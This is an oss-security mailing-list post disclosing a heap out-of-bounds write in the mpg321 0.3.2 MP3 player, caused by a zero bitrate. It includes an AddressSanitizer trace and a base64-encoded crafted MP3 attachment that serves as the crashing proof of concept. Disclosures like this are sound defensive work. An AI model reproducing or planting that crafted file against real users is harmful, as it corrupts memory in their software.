X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9184" "Friday" "7" "December" "2018" "22:16:59" "-0500" "Ren Kimura" "rkx1209dev@gmail.com" "<CALoRt7TAYGsPRWqtDqJ4dyKfV1O634qYfbq9pDU_X1K=A9ONgQ@mail.gmail.com>" "177" "[oss-security] mpg321: Out-of-bounds Write" "^Date:" nil nil "12" "2018120803:16:59" "[oss-security] mpg321: Out-of-bounds Write" (number mark "        rkx1209dev@g Dec  7  177/9184  " thread-indent "\"[oss-security] mpg321: Out-of-bounds Write\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 23900 invoked by uid 550); 8 Dec 2018 13:09:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32473 invoked from network); 8 Dec 2018 03:17:23 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=f/67mkpHeKRYdzMZGuaBWKgb/1XdvW5pw8VR3xPsM4c=;
        b=chmmPajKJAfXV3g4emtsacMSBTtzsIQ709QxtQ6qug7rc4pgPnCZ0A+u1VDcTBHRod
         2THnksfYiRwiwCn7OmpZiVM6OH8oNS4NZI/0k4TRRT7QfPTArxNxlN5OLQumClZNaFSb
         GZBhIq0hkM/eEAatRp4vfSon3zmGem8LbWWY9JOCeZXdpBamhutSfAAVJTOq+VpIC4kq
         HPGCMTRjwviz+uG/UmDfW45X1vKJKcxHbF+ZBKig5HAq7QFfvAmpe4LcNb3DS/4D1WD+
         5axIpaJ5M+LF5YBC68Aw80Sf1NF96FCsdess01CTPwukChayUpG2CGbMV185SyjZhXm5
         TJZg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=f/67mkpHeKRYdzMZGuaBWKgb/1XdvW5pw8VR3xPsM4c=;
        b=U+LxJJ4OBGNKtjtwXd6t5J6/N2sthQzkRwi+MvA+Mp4vLIWy5O3cVIVIPj1UyB/T8H
         lIStLLnDgzn1Xc+wKm/dwgtFV032Ct4yosGnkUT5E196aoJIkDree0TcogKKNeSm/l6/
         44AtK3ANZtcGAXk2VDrs9YjeQKrOOPhaIvbjGkzEgGo+8uawDe7JzhxHyUwnEesXJHZa
         cmYgzH46TA0ZEr1Evbi4dXnO6NCyDVT3dRLMIFwDjYO0yamb9/vKahVWPtWcXWtqbDQr
         BQDLlxquG9Z8ysbmIJB9zR5cmy2MYkcw7R2WF2tlvtmxrvPg3abavDdHw0Vjqb6P23fK
         SH2A==
X-Gm-Message-State: AA+aEWa/q8Zn1+0ThgH6IUOBBsPzuA/Za9AQdg8bYCo1K0hDL6if1UE6
	nCkL3KNZgQIqVUu6wU0ka+wvjrYojrO8uL+3FxqGDJao
X-Google-Smtp-Source: AFSGD/W/7wKu9QWAZAQFaq5Ehsj+srvX/OnnPAiaugrFT2BuZh7zoecugSjsdtc2zFAtICYxqguV4TXyBNg4iEClRdg=
X-Received: by 2002:a9f:2b44:: with SMTP id q4mr1943346uaj.126.1544239031199;
 Fri, 07 Dec 2018 19:17:11 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CALoRt7TAYGsPRWqtDqJ4dyKfV1O634qYfbq9pDU_X1K=A9ONgQ@mail.gmail.com>
Content-Type: multipart/mixed; boundary="000000000000e7bd7d057c7a2a88"
Date: Fri, 7 Dec 2018 22:16:59 -0500
From: Ren Kimura <rkx1209dev@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] mpg321: Out-of-bounds Write
To: oss-security@lists.openwall.com

--000000000000e7bd7d057c7a2a88
Content-Type: text/plain; charset="UTF-8"

Hi.
mpg321 is a free command-line mp3 player that is commonly available on
many Linux distributions.
For example, in ubuntu you can download the latest mpg321 by "apt-get
install mpg321."

latest mpg321 0.3.2, in scan() in mad.c calculate the number of frames
using bit rate.
If crafted mp3 whose bit rate equal 0 is taken, sampling time become
INF value due to floating point division by 0.
As a result, the frame number become a very large (1<<63), leading out
of bounds write, memory corruption at mad.c:285.
note. frames buffer have been allocated only 8-byte at mpg321.c:990.

I'll request a CVE ID from MITRE.

ASAN crash traces:

Playing MPEG stream from mpg321_0.3.2_memory_corruption.mp3 ...
=================================================================
==18648==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x6020000000d8 at pc 0x555555566c18 bp 0x7fffffffb3$
0 sp 0x7fffffffb3c0
WRITE of size 8 at 0x6020000000d8 thread T0
    #0 0x555555566c17 in read_header
/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mad.c:285
    #1 0x7ffff64c0594  (/usr/lib/x86_64-linux-gnu/libmad.so.0+0x5594)
    #2 0x7ffff64c0b82 in mad_decoder_run
(/usr/lib/x86_64-linux-gnu/libmad.so.0+0x5b82)
    #3 0x5555555607fb in main
/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321.c:1092
    #4 0x7ffff5b43b96 in __libc_start_main
(/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #5 0x555555562779 in _start
(/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321-asan+0xe779)

0x6020000000d8 is located 0 bytes to

0x6020000000d8 is located 0 bytes to the right of 8-byte region
[0x6020000000d0,0x6020000000d8)
allocated by thread T0 here:
    #0 0x7ffff6ef8b50 in __interceptor_malloc
(/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x555555561b51 in main
/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321.c:990

SUMMARY: AddressSanitizer: heap-buffer-overflow
/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mad.c:285 in
 read_header
Shadow bytes around the buggy address:
  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff8000: fa fa 06 fa fa fa 06 fa fa fa 01 fa fa fa 00 00
=>0x0c047fff8010: fa fa 00 00 fa fa 06 fa fa fa 00[fa]fa fa 00 00
  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa

Ren Kimura

--000000000000e7bd7d057c7a2a88
Content-Type: audio/mp3; name="mpg321_0.3.2_memory_corruption.mp3"
Content-Disposition: attachment; 
	filename="mpg321_0.3.2_memory_corruption.mp3"
Content-Transfer-Encoding: base64
Content-ID: <f_jpeumh520>
X-Attachment-Id: f_jpeumh520

M/JywE8nABhgngYVSXgAUZQIC2M5/CCBBELhgkTJ5AIFAxEgEyDFxWK3hQNW
LmhcaBTO6P393/B81B8H1A++XByJ3/Bxwn68o6UGgg6IPEHyhxvLvB/8o4EP
6gf5d5wTnwf/Lwf5d8u8P4fX/l9b+T93lnlWiPImuwAS6a6CgPoqBEAUSS2I
4OVIQcjwPgTAqOg9kSTQuAskMGPIaQAfRIG5oH7jaKgpEEeCIk45oThPpJpr
LpdW//JywL6jRiFr3u71jJkCt6kOdJ/rHIb89+n/df0XFlldvWkKRJNv233p
u3UaP+vr7////FBsjx+c/7zXV5b3Yyeq+JjWahRFjtDkpe9q01T20hmZvMzY
vDIbf//zcH7//4L/Lhr/4P///////////87//0b/UYz///9I//+D//////+1
//9TVv+Qkv///+v/pv/9/zD//zL//wEDMHg0MDYweDJBMHhGNDIzRjB4NjSK
MHgyMDAweEM4MHgxMDEweDEwMHg1ODY5NkU2NzB4RjQyMkYweDFGRjB4RjQy
M0YweEZGRkZGRkatNTB4MTAxMHhDMDAwLngyMDFMSaD/BUxsZJJf1frxfk1o
MkTQnYqt/9RkpvbfRRJkLLj/pJXMRYXb//UlUXhSQg0nUdds/qQ9aJDR6yP/
df9XexND+XUTr/8yVsy6oMedju3wMyL9/wMDJlRCO5AUGINV8KvvKx/j/L9I
RmJRReKW/l+v1+FydLC0LJz/8nLACVDLJjvhptVOZth2Z2ep5bRUUrrVcadn
g42VXIPsYVF5C4o3e3L5uWVbF+vn+WS7HjyRgK8BCHUl///cWkPQDRVD0V7/
1FVtlJ3Zs4Q4NnDgT6L4+CAsbXV/9VkiESITiftVatX1anUos7JpuTAgK62/
84n//MhSR/lv/ptIaXBZm/8SLVXf6hOLGtHoA+nacKnlHECeO88rlgkO9nd9
//7//9aeKgWD0849QW6TGMV+We//8nDATh3aKOPipv5OItgfcJFI69jna0ba
nDB4ODA4MHgxMDAwMHgxRjB4NkUweDZENkbKMHgzMUZFNtMweDMxRjB4MURD
MIsyMzB4QziQ6UU1qs2afLCvcwt2Mtbt2SF4COlpavUyamdTILVuah2VLUXU
i4GCHEam7mCKaCWmTNyGEvbYwZIwW6DqCyQxbYJCflsv1M1SLk1MybGn0jiC
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
1qKk+tX/okeOxv/7/8j/X3rHyO/9fyT///8y///b/9u7/+///5T//8v////8
/////////8I3ryUcAp7//yLY//5ULOr/cv+1Hv///P9fMHgxNEIw/zf/////
/0YweDEw/jAw//9BMP///////zJFMHg4MDD///94//8v//81MHgx/zEw//7/
////M///AwNw7CPMz9N3LmdzO53ta48aN3M53XzDGxLqM5YWozWyvyrPLf96
K1JAngLJaS7/X+oQoA2nkDI1RYlaHHr1uoexGQ7PZXYzDaISNlLEID+gfb//
6xM2uTtxL7rvy6xuSdSmRnR6M3/rE1ELrt/qJ6S/mD+EWjAweDgwOJMweDJF
NDbzRjB4MURGy0Y0MHgxMDEyRbeRzDB4RTYweDIzMHgyQTB4QzAwMDAweDdG
MHgyQTB4NjV4NzAwMDBGMDB4NTQweDEwMcXIMHgxREYweDI4MUYweDc1MHgy
MDGq4IUwdzdGMHgxNEIweDIwMTB4MkUweEZGRjMxMHg1QzB4MURGMjB4eDJC
MHczMUYweDQ2MHgzMUYweDgwOJWbtTB4NC82MHgyRTB4MTRCojB4MjM1MHg2
Qzc1MkH2MHg3MzB4MjM1MzFFMHg4MDhFREYwMHgxMDB3MTAxRjAweDY4NDB4
NzUweDgwMDA05bk1ODB4N0YweDEwMjgweEZGRkZGRkZGMDB4MjMxNIIweDIz
QTEyRjJFz8rClqUweDEwMHg2RjB3MzFGNzMveDgwMEVBMjEweDE0QjAweDgw
ODB4LTEweDNGRYQweDJCgDZFRkFCMHgyMDGqhjB4Njg0N0U2MHg0NjB4NTg2
OTB4NkUveDNGRTB4NkM2RTY3MjjVMzB4RkEweDEwMDAweEYwMDAwMDAwNzB4
NkUwdzJEMHgxMDC6RTYwdy0xMHgzMUYweDMxRjB4MTCUxv////8weP+T

--000000000000e7bd7d057c7a2a88--
